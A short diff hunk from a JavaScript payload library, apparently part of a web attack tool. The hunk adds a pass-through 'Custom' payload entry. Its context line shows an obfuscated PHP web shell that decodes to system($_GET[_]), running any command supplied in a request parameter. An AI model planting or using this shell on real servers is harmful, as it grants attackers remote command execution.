@@ -338,3 +338,7 @@ window.Payload.Shell = {
       '<?=(~%8C%86%8C%8B%9A%92)(${_.(~%B8%BA%AB)}[_]);',
   },
 }
+
+window.Payload.Custom = {
+  insert: value => value,
+}
